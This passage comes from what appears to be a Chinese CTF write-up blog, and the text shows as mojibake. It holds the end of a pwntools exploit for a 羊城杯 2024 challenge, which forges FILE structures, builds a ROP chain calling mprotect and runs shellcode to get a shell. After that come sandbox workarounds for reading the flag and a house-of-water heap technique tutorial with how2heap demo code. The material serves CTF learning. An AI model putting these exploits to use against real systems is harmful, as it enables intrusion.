class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read[<span class="number">0x10</span>:])</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">target = stack - <span class="number">720</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000166262</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000003fa43</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x0000000000099a83</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000023a60</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x7b0</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rdi_ret, heap_base,</span><br><span class="line">    pop_rsi_ret, <span class="number">0x2000</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">7</span>,</span><br><span class="line">    mprotect, </span><br><span class="line">    pop_rbp_ret, heap_base + <span class="number">0x3000</span>,</span><br><span class="line">    pop_rax_call_rax, shellcode_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå³å¯ç¨³å®šæ‹¿ <code>shell</code>ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯æ˜¯è¿™ä¸ª <code>shell</code> å¹¶ä¸èƒ½ä½¿ç”¨ <code>lsã€cat</code> è¿™äº›æŒ‡ä»¤ï¼Œåªèƒ½ä½¿ç”¨ <code>cdã€pwdã€echo</code> è¿™ç§æ¯”è¾ƒåŸºæœ¬çš„ï¼Œè€Œä¸” <code>echo</code> çš„åŠŸèƒ½è¿˜ä¸å…¨ï¼Œä¸‹é¢ç»™å‡ºä¸€äº›å¯ä»¥ç”¨æ¥å¹³æ›¿çš„è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>é‚£ä¸ºä»€ä¹ˆ <code>lsã€cat</code> ç­‰æŒ‡ä»¤æ— æ³•ä½¿ç”¨å‘¢ï¼Ÿè¿™é‡Œä»¥ <code>ls</code> ä¸ºä¾‹è§£é‡Šä¸€ä¸‹ï¼š<br>lså‘½ä»¤çš„å®ç°å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š  </p><ol><li><p>æ‰“å¼€ç›®å½•ï¼šé¦–å…ˆï¼Œéœ€è¦æ‰“å¼€è¦åˆ—å‡ºæ–‡ä»¶çš„ç›®å½•ã€‚å¯ä»¥ä½¿ç”¨ <code>open()</code> ç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€ç›®å½•ï¼Œå¹¶è·å¾—ä¸€ä¸ªç›®å½•æ–‡ä»¶æè¿°ç¬¦ã€‚  </p></li><li><p>è¯»å–ç›®å½•é¡¹ï¼šé€šè¿‡ <code>readdir()</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥ä»æ‰“å¼€çš„ç›®å½•ä¸­è¯»å–ç›®å½•é¡¹ã€‚<code>readdir()</code> ä¼šè¿”å›ä¸€ä¸ªæŒ‡å‘ç›®å½•é¡¹ç»“æ„ä½“çš„æŒ‡é’ˆã€‚é€šè¿‡å¾ªç¯è°ƒç”¨ <code>readdir()</code>ï¼Œå¯ä»¥é€ä¸ªè¯»å–ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚  </p></li><li><p>è¿‡æ»¤éšè—æ–‡ä»¶ï¼šåœ¨è¯»å–ç›®å½•é¡¹ä¹‹åï¼Œéœ€è¦å¯¹ç›®å½•é¡¹è¿›è¡Œè¿‡æ»¤ã€‚Linuxä¸­çš„éšè—æ–‡ä»¶ä»¥.å¼€å¤´ï¼Œå¯ä»¥é€šè¿‡åˆ¤æ–­ç›®å½•é¡¹çš„åå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º.æ¥è¿‡æ»¤éšè—æ–‡ä»¶ã€‚  </p></li><li><p>è¾“å‡ºç›®å½•é¡¹ä¿¡æ¯ï¼šè¯»å–åˆ°ä¸€ä¸ªç›®å½•é¡¹ä¹‹åï¼Œå¯ä»¥é€šè¿‡ç›®å½•é¡¹ç»“æ„ä½“ä¸­çš„å­—æ®µè·å–æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼Œæ¯”å¦‚æ–‡ä»¶åã€å¤§å°ã€ä¿®æ”¹æ—¶é—´ç­‰ã€‚å¯ä»¥ä½¿ç”¨ <code>printf()</code> å‡½æ•°å°†è¿™äº›ä¿¡æ¯è¾“å‡ºåˆ°ç»ˆç«¯ã€‚  </p></li><li><p>å…³é—­ç›®å½•ï¼šä½¿ç”¨ <code>closedir()</code> ç³»ç»Ÿè°ƒç”¨æ¥å…³é—­æ‰“å¼€çš„ç›®å½•ï¼Œé‡Šæ”¾èµ„æºã€‚</p></li></ol><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œ <code>ls</code> å‘½ä»¤éœ€è¦ä½¿ç”¨ <code>open</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æ˜¯æˆ‘ä»¬æ‹¿åˆ°çš„ <code>shell</code> ä¾ç„¶å¤„äºæ²™ç®±çš„ç¯å¢ƒä¸­ï¼Œ<code>open</code> ç³»ç»Ÿè°ƒç”¨ç»™ç¦æ­¢ä½¿ç”¨ï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬æ— æ³•ä½¿ç”¨ <code>ls</code> å‘½ä»¤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>house of water &amp; TFCCTF 2024 MCGUAVA</title>
      <link href="/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"/>
      <url>/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/</url>
      
        <content type="html"><![CDATA[<h2 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h2><p>æ—©å°±å¬ Csome å­¦é•¿è¯´è¿‡æœ‰ç§æ‰“æ³•å« house of waterï¼Œä½†æ˜¯å½“æ—¶æ²¡å»çœ‹ï¼Œæ—¶é—´ä¹…äº†å°±å¿˜è®°è¿™ä¸ªä¸œè¥¿äº†ï¼Œç°åœ¨è®°èµ·æ¥äº†å°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ç”±äºç¬”è€…çš„æ°´å¹³æœ‰é™ï¼Œæ–‡ç« ä¸å…ä¼šå‡ºç°è®¸å¤šé”™è¯¯ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…èƒ½è¿‡åŒ…å®¹ä»¥åŠæŒ‡æ­£ã€‚è¿™ç¯‡æ–‡ç« çš„ç¨‹åºçš„æµ‹è¯•ç¯å¢ƒä¸º ubuntu 22.04.3 TLSã€‚</p><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>è¿™ä¸ªæ‰“æ³•ç”±å›½é™…æˆ˜é˜Ÿ blue water æå‡ºçš„ï¼Œä¸‹é¢æ¥çœ‹çœ‹è¯¥å›¢é˜Ÿå¯¹è¿™ä¸ªæ‰“æ³•çš„æè¿°ï¼š</p><blockquote><p>House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache<br>metadata control primitive, with the added benefit of obtaining a free libc pointer in the<br>t-cache metadata as well.</p><p>NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will<br>contain 4 bits of randomness. If you can increment integers, no brutefore is required.</p><p>By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a â€œfakeâ€ heap chunk header of<br>size â€œ0x10001â€ is created.</p><p>This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked<br>address entries, enabling the creation of a fully functional fake unsorted-bin entry.</p><p>The correct size should be set for the chunk, and the next chunkâ€™s prev-in-use bit<br>must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values<br>should be written.</p><p>Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control<br>is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer<br>to be ready for allocation as well.</p><p>Technique &#x2F; house by @udp_ctf - Water Paddler &#x2F; Blue Water </p></blockquote><p>ç›¸ä¿¡å¤§å¤šæ•°äººéƒ½æ²¡çœ‹æ‡‚ï¼ˆæ„Ÿè§‰æ˜¯æˆ‘ç†è§£åŠ›æœ‰å¾…æé«˜ğŸ˜­ï¼‰ï¼Œä¸è¿‡ä¸ç”¨ç€æ€¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šè¿›è¡Œæ¯”è¾ƒè¯¦ç»†çš„è®²è§£ã€‚<br>è¯¥æ‰“æ³•çš„åˆ©ç”¨å‰ç½®æ¡ä»¶å¦‚ä¸‹ï¼š</p><blockquote><p>ç¨‹åºå­˜åœ¨UAFæ¼æ´<br>ç¨‹åºå¯ä»¥ç”³è¯·ä½å¤Ÿå¤§çš„å †å—</p></blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®Œæˆè¯¥æ‰“æ³•ä¸éœ€è¦æ³„éœ²ä»»ä½•å†…å­˜åœ°å€ä¸”ä¸éœ€è¦ä»»ä½•å †ä¸Šçš„æº¢å‡º<br>æœ€ç»ˆçš„æ•ˆæœæ˜¯èƒ½å¤Ÿåœ¨ tcache çš„é“¾è¡¨ä¸Šç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ï¼Œå¹¶å°†å…¶ç”³è¯·å‡ºæ¥ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“ç¨‹åºå¼€å§‹è¿è¡Œå¹¶é‡åˆ°å®ƒçš„ç¬¬ä¸€ä¸ª malloc æ—¶ï¼Œå †ï¼ˆmain arenaï¼‰å°†è¢«åˆå§‹åŒ–ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ˆlibc 2.31+ï¼‰ï¼Œå°†åˆ†é… 0x290 çš„å†…å­˜å¤§å°æ¥å­˜å‚¨ tcache_perthread_struct ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å­˜å‚¨å„ä¸ªä¸åŒ size çš„ tcache é“¾è¡¨çš„ chunk çš„ä¸ªæ•°ä»¥åŠæœ€åè¿›å…¥é“¾è¡¨çš„ chunk çš„ data åŒºåŸŸåœ°å€ã€‚ è¯¥ç»“æ„ä½“çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­çš„ entries åŒºåŸŸç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ï¼Œè¿›è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿç”³è¯· libc ä¸Šçš„å†…å­˜</p><h3 id="Attack-Demo"><a href="#Attack-Demo" class="headerlink" title="Attack Demo"></a>Attack Demo</h3><p>è¿™é‡Œæˆ‘ä»¬é€‰ç”¨ how2heap ä¸­çš„ <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c">house of water</a> è¿™ä¸ªä¾‹å­æ¥è§£é‡Šï¼Œè¿™é‡Œæˆ‘åšäº†ä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼ŒæŠŠä¸€äº›è‹±æ–‡æ®µè½è¿›è¡Œäº†åˆ é™¤ï¼Œåªç•™ä¸‹ç¨‹åºæ‰§è¡Œä»£ç </p><h4 id="house-of-water-c"><a href="#house-of-water-c" class="headerlink" title="house_of_water.c"></a>house_of_water.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 22.04.3 LTS</span></span><br><span class="line"><span class="comment">// gcc -g house_of_water.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line"><span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line"><span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line"><span class="built_in">free</span>(fake_size_msb);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);  <span class="comment">// Padding</span></span><br><span class="line"><span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_end);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_middle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_start);</span><br><span class="line"></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"> </span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line"><span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line"></span><br><span class="line">assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨ç¼–è¯‘é˜¶æ®µæˆ‘ä»¬ä½¿ç”¨äº†â€œ-gâ€å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨gdbåœ¨ä»»æ„è¡Œä¸‹æ–­ç‚¹<code>b + è¡Œå·</code><br>æ¥ä¸‹æ¥å¯¹è¿™æ®µ demo è¿›è¡Œè°ƒè¯•<br>å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 18 è¡Œï¼Œæ­¤æ—¶ç¨‹åºå®Œæˆçš„æ“ä½œå¦‚ä¸‹ï¼š<br>ç”³è¯·äº† 2 ä¸ªå †å—ï¼Œsize åˆ†åˆ«ä¸º 0x3e0 å’Œ 0x3f0ï¼Œç´§æ¥ç€å°†å…¶é‡Šæ”¾æ‰<br>æˆ‘ä»¬æ¥çœ‹çœ‹æ­¤æ—¶çš„ tcache_perthread_struct ç»“æ„ä½“ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªæ¡†æ¡†çš„åœ°æ–¹çš„åœ°å€å°±æ˜¯æˆ‘ä»¬åˆšæ‰é‡Šæ”¾çš„ 2 ä¸ªå †å—åœ°å€ï¼Œè€Œç¬¬ä¸€ä¸ªæ¡†æ¡†åˆ™æ˜¯ size ä¸º 0x3e0 å’Œ 0x3f0 å¯¹åº”çš„ tcache é“¾è¡¨ chunk çš„ä¸ªæ•°ï¼Œç„¶è€Œè¿™ä¸ª heapbase+0x88 è¿™ä¸ª 0x10001 å¯ä»¥ä½œä¸ºæˆ‘ä»¬fake chunk çš„sizeï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªåœ°æ–¹ä½œä¸º fake chunk å¹¶æ”¾å…¥ unsorted binï¼ˆåé¢ç§°è¿™ä¸ª chunk ä¸º fake unsorted chunkï¼‰ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ tcache_perthread_struct ç»“æ„ä½“ä¸Šè¸©ä¸Š libc çš„åœ°å€ã€‚<br>æ¥ä¸‹æ¥å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 0x38 è¡Œï¼Œè¿™æœŸé—´åšçš„éƒ½æ˜¯å †å—ç”³è¯·å·¥ä½œï¼š<br>è¿ç»­ç”³è¯·äº† 7 ä¸ª 0x90 å¤§å°çš„ chunkï¼Œç„¶åäº¤æ›¿ç”³è¯· 0x90 å’Œ 0x20 å¤§å°çš„ chunkã€‚æˆ‘ä»¬æœ€ç»ˆå¸Œæœ›æœ€åç”³è¯·çš„ 3 ä¸ª 0x90 å¤§å°çš„chunk å¯ä»¥è¿›å…¥ unsorted binï¼Œæ‰€ä»¥æ¯ 2 ä¸ª chunk ä¹‹é—´éƒ½ç”³è¯·ä¸€ä¸ªå°å †å—æ¥é˜²æ­¢ä»–ä»¬åˆå¹¶ã€‚è¿™é‡Œå°†è¦è¿›å…¥ unsorted bin çš„ä¸‰ä¸ª chunk åˆ†åˆ«å‘½åä¸ºï¼šunsorted_startã€unsorted_middleã€unsorted_endã€‚å¾ˆå¥½ç†è§£å§ï¼Œå¼€å§‹ã€ä¸­é—´ã€ç»“æŸğŸ˜‹<br>æœ€åè¿˜ç”³è¯·äº†ä¸€ä¸ªç‰¹åˆ«å¤§çš„ chunkï¼Œsize ä¸º 0xf0010ï¼Œåé¢ç´§æ¥ç€ä¸€ä¸ª size ä¸º 0x20 çš„å° chunk<br>æ¥ç€å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 41 è¡Œï¼Œè¿™é‡Œåœ¨æœ€åé‚£ä¸ª size ä¸º 0x20 çš„ chunk çš„ fd ä½ç½®å†™ä¸Š 